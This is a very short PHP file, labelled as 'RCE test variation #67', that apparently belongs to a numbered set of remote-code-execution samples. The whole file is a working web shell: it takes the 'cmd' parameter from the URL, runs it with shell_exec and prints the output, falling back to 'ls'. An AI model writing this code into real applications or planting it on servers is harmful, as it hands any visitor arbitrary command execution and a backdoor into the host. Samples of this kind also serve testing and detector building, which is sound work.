<?php
// RCE test variation #67
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>